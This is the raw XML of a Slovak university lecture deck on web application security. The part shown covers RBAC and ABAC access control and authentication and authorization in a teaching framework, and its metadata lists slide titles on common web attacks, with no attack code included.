              <a:t>Ľahká implementácia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A7AFDA19-70C2-E6E6-287B-A90E4FAE27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7347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681D25-651A-CC8D-C571-A7126E237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Schéma RBAC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DF630D89-73A4-8CF0-A691-3026B6DCF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51</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Obrázok 4" descr="Obrázok, na ktorom je snímka obrazovky, diagram, dizajn&#10;&#10;Automaticky generovaný popis">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{82ACE84B-1DBC-2C86-119A-01FCFB5BC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378" y="1496279"/>
            <a:ext cx="5773372" cy="3246446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4FBBCFFB-E88A-D59D-DBF7-99085437F041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5296174" y="4648847"/>
            <a:ext cx="341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900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Zdroj: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.imanami.com/how-rbac-is-different-from-abac/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204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1155192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7EC671-D689-936F-246C-09EB9A75C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Attribute-based</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> Access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> (ABAC)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0E9CD9B-AB31-C424-4814-C310F6313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Model riadenia prístupu k zdrojom založený na atribútoch:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Komponenty:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Atribúty používateľov</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Atribúty zdrojov</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Atribúty prostredia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Politika prístupu je definovaná kombináciou atribútov</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Dynamickejší a flexibilnejší prístup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Jemnejšia granularita definovania prístupu k zdrojom</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="127000" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p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B8A609BC-284D-99CE-AC3A-5D38B6CF8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426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FE87AD-CC57-5429-4699-FF65BC97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Schéma ABAC </a:t>
            </a:r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C284DE99-DCE5-3785-FDD0-71FA801019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53</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Obrázok 5" descr="Obrázok, na ktorom je text, diagram, snímka obrazovky, plán&#10;&#10;Automaticky generovaný popis">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CF12C87-762E-79F7-C4D6-44803211F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87" y="1452077"/>
            <a:ext cx="5633711" cy="3366143"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="BlokTextu 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C1C77B1-52E6-E3D9-FE12-5750905151D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5296174" y="4650546"/>
            <a:ext cx="3411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sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Zdroj: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.imanami.com/how-rbac-is-different-from-abac/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204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490085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5E92B-51E1-C347-685E-D98E92CE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0AEC85-975B-3330-F3E4-0A2A1F77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Otázka 3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33A08F29-BD87-046B-7B7D-05EF3FF54C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54</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Obrázok 7" descr="Obrázok, na ktorom je písmo, text, logo, grafika&#10;&#10;Obsah vygenerovaný pomocou AI môže byť nesprávny.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{846885D9-72E2-EC01-6F32-7A534E48D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124" y="906717"/>
            <a:ext cx="4015740" cy="4015740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="BlokTextu 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B4DCE7E-9619-58BE-4C9D-27E502588533}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2285994" y="462028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https://www.fri.uniza.sk/cms/quizzes/questions/qr/33</a:t>
            </a:r>
            <a:endParaRPr lang="sk-S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1707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8C4956-E369-626E-8F6E-4F647A7F4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Autentifikácia a autorizácia vo FW Vajíčko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7D181B2-7511-457C-4FBA-E46E00118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sz="1800" dirty="0"/>
              <a:t>Autentifikácia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1600" dirty="0"/>
              <a:t>Implementácia </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1600" dirty="0" err="1"/>
              <a:t>IAuthenticator</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>implementuje aj overenie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1"/>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>/heslo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>vytvára Identitu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1600" dirty="0" err="1"/>
              <a:t>AppUser</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>Informácie o používateľovi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>Či je </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1"/>
              <a:t>príhlásený</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1"/>
              <a:t>neprihlasený</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>, prihlásený má Identitu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t>Dostupný v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1"/>
              <a:t>kontroleroch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1"/>
              <a:t>views</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"/>
              <a:t> automaticky</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:endParaRPr lang="sk-SK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7BB3B1FA-3DBF-CA7E-F958-BB85040769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6957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4ED7FAA-0F9D-3344-CC11-2D3EAC2F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Autentifikácia a autorizácia vo FW Vajíčko</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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32ECC6C-CD7A-10B4-4610-E28396F5C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/>
              <a:t>Autorizácia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Kontrola prístupových práv</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Metóda </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>authorize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>v kontrolóroch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Kompletne v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t>réžii vývojára</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0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82A123B3-2062-41E0-357D-FB65130A6B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08523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a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B2D83F1BFE774693A9D47ED296DF0D" ma:contentTypeVersion="9" ma:contentTypeDescription="Umožňuje vytvoriť nový dokument." ma:contentTypeScope="" ma:versionID="c0c488197a3ee1e11cdcc86b9b580f30">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns2="7d1569f7-a9ba-4934-9f41-02a47fb0fb0d" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="d58b5c67a4475fad4ce3c58aaffffe09" ns2:_="">
    <xsd:import namespace="7d1569f7-a9ba-4934-9f41-02a47fb0fb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1569f7-a9ba-4934-9f41-02a47fb0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d1569f7-a9ba-4934-9f41-02a47fb0fb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0A2D-125B-461E-A448-5073CA91DFC6}"/>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{AC0FC054-6C13-4E09-9BF9-22358BEAB3D0}">
  <ds:schemaRefs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7d1569f7-a9ba-4934-9f41-02a47fb0fb0d"/>
    <ds:schemaRef ds:uri="17997581-6305-4412-b1ec-da9a29fddff1"/>
    <ds:schemaRef ds:uri="dd2fa11e-5d6d-4f8f-8f02-a7597448bda5"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{2249D2B5-5971-4DF2-BE34-DC07641A9CC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3023</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Prezentácia na obrazovke (16:9)</PresentationFormat>
  <Paragraphs>479</Paragraphs>
  <Slides>56</Slides>
  <Notes>32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56</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="63" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Cabin</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>JetBrains Mono</vt:lpstr>
      <vt:lpstr>Noto Sans Symbols</vt:lpstr>
      <vt:lpstr>Roboto Mono</vt:lpstr>
      <vt:lpstr>Dividenda</vt:lpstr>
      <vt:lpstr>Bezpečnosť webových aplikácií </vt:lpstr>
      <vt:lpstr>Prezentácia programu PowerPoint</vt:lpstr>
      <vt:lpstr>Webové útoky </vt:lpstr>
      <vt:lpstr>Problémy bezpečnosti – strana klienta</vt:lpstr>
      <vt:lpstr>Problémy bezpečnosti – strana servera</vt:lpstr>
      <vt:lpstr>Bezpečnosť internetových technológií</vt:lpstr>
      <vt:lpstr>Bezpečnosť kódu na strane servera</vt:lpstr>
      <vt:lpstr>Najčastejčie typy web útokov</vt:lpstr>
      <vt:lpstr>Útok typu OS command injection</vt:lpstr>
      <vt:lpstr>Útok typu Directory traversal</vt:lpstr>
      <vt:lpstr>Útok typu SQL injection</vt:lpstr>
      <vt:lpstr>SQL injection – ukážka</vt:lpstr>
      <vt:lpstr>Ukážka SQL injection vo Vaííčko FW</vt:lpstr>
      <vt:lpstr>Útok typu Cross site scripting (XSS)</vt:lpstr>
      <vt:lpstr>XSS útok typu 1 (DOM based)</vt:lpstr>
      <vt:lpstr>XSS útok typu 2 (reflected)</vt:lpstr>
      <vt:lpstr>XSS útok typu 3 (stored)</vt:lpstr>
      <vt:lpstr>Útok typu Session hijacking</vt:lpstr>
      <vt:lpstr>Útok typu Cross-site request forgery</vt:lpstr>
      <vt:lpstr>Zásady tvorby bezpečných web aplikácií</vt:lpstr>
      <vt:lpstr>Payloads All The Things </vt:lpstr>
      <vt:lpstr>Validácia požívateľského vstupu</vt:lpstr>
      <vt:lpstr>Typy validácie</vt:lpstr>
      <vt:lpstr>Príklady client-side validácie</vt:lpstr>
      <vt:lpstr>Validácia na serveri</vt:lpstr>
      <vt:lpstr>Otázka 1</vt:lpstr>
      <vt:lpstr>Autentifikácia používateľov vo web aplikáciách</vt:lpstr>
      <vt:lpstr>Aplikácie s autentifikáciou používateľa</vt:lpstr>
      <vt:lpstr>Vlastná (formulárová) autentifikácia</vt:lpstr>
      <vt:lpstr>Password salting – princípy </vt:lpstr>
      <vt:lpstr>Solenie hesiel – implementácia v PHP</vt:lpstr>
      <vt:lpstr>SSL / TSL protokol</vt:lpstr>
      <vt:lpstr>Možnosti TLS </vt:lpstr>
      <vt:lpstr>Verejný a súkromný kľúč</vt:lpstr>
      <vt:lpstr>Autentifikácia servera</vt:lpstr>
      <vt:lpstr>Autentifikácia klienta</vt:lpstr>
      <vt:lpstr>Otázka 2</vt:lpstr>
      <vt:lpstr>HTTP autentifikácia</vt:lpstr>
      <vt:lpstr>Typy HTTP autentifikácie</vt:lpstr>
      <vt:lpstr>Autentifikácia založená na tokenoch </vt:lpstr>
      <vt:lpstr>JSON Web Token (JWT) </vt:lpstr>
      <vt:lpstr>Zloženie JWT tokenu</vt:lpstr>
      <vt:lpstr>JWT hlavička (header)</vt:lpstr>
      <vt:lpstr>JWT obsah (payload)</vt:lpstr>
      <vt:lpstr>JWT podpis (signature)</vt:lpstr>
      <vt:lpstr>Postup pri JWT autentifikácii</vt:lpstr>
      <vt:lpstr>OpenID Connect</vt:lpstr>
      <vt:lpstr>Ako OpenID Connect funguje</vt:lpstr>
      <vt:lpstr>Autentifikácia – autorizácia </vt:lpstr>
      <vt:lpstr>Role-Based Access Control (RBAC)</vt:lpstr>
      <vt:lpstr>Schéma RBAC</vt:lpstr>
      <vt:lpstr>Attribute-based Access Control (ABAC)</vt:lpstr>
      <vt:lpstr>Schéma ABAC </vt:lpstr>
      <vt:lpstr>Otázka 3</vt:lpstr>
      <vt:lpstr>Autentifikácia a autorizácia vo FW Vajíčko</vt:lpstr>
      <vt:lpstr>Autentifikácia a autorizácia vo FW Vajíčko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Bezpečnosť webových aplikácií </dc:title>
  <cp:lastModifiedBy>Michal Ďuračík</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-25T14:42:39Z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0x0101003AB2D83F1BFE774693A9D47ED296DF0D</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="Order">
    <vt:r8>4000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  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="_SourceUrl">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="12" name="_SharedFileIndex">
    <vt:lpwstr/>
  </property>
</Properties>
</file>